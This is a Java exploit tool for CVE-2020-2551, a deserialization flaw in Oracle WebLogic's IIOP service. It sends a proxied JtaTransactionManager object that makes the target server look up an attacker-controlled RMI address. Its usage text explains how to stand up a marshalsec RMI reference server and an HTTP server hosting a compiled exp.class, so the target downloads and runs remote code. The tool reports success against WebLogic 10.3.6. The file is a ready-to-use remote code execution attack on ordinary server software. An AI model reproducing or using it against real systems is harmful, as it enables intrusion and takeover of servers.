package com.payload;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import com.nqzero.permit.Permit;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Main {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static void main(String[] args) {
        try {
            if (args.length != 3) {
                System.out.println("java -jar IIOP_CVE_2020_2551.jar rhost rport rmiurl");
                System.out.println("java -jar IIOP_CVE_2020_2551.jar 172.16.1.128 7001 rmi://172.16.1.1:1099/exp");
                System.out.println("先起一个RMIRefServer服务");
                System.out.println("java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://172.16.1.1/#exp\" 1099");
                System.out.println("jdk1.6\\bin\\javac exp.java 将生成的exp.class放入当前目录");
                System.out.println("exp.class目录起一个WEB服务 python3 -m http.server --bind 0.0.0.0 80");
                System.out.println("test on weblogic 10.3.6 success!");
                System.out.println("welcome to myblog: http://Y4er.com");
                System.exit(0);
            }
            String ip = args[0];
            String port = args[1];
            String rmiurl = args[2];
            String rhost = String.format("iiop://%s:%s", ip, port);

            Hashtable<String, String> env = new Hashtable<String, String>();
            // add wlsserver/server/lib/weblogic.jar to classpath,else will error.
            env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
            env.put("java.naming.provider.url", rhost);
            Context context = new InitialContext(env);
            // get Object to Deserialize
            JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
            jtaTransactionManager.setUserTransactionName(rmiurl);

            Remote remote = createMemoitizedProxy(createMap("pwned"+System.nanoTime(), jtaTransactionManager), Remote.class);
            context.rebind("Y4er"+System.nanoTime(), remote);
        } catch (Exception ex) {
            ex.printStackTrace();
            System.out.println("------------------------");
            System.out.println("----没有回显   自行检测----");
            System.out.println("------------------------");
        }
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }

    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Main.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }
}
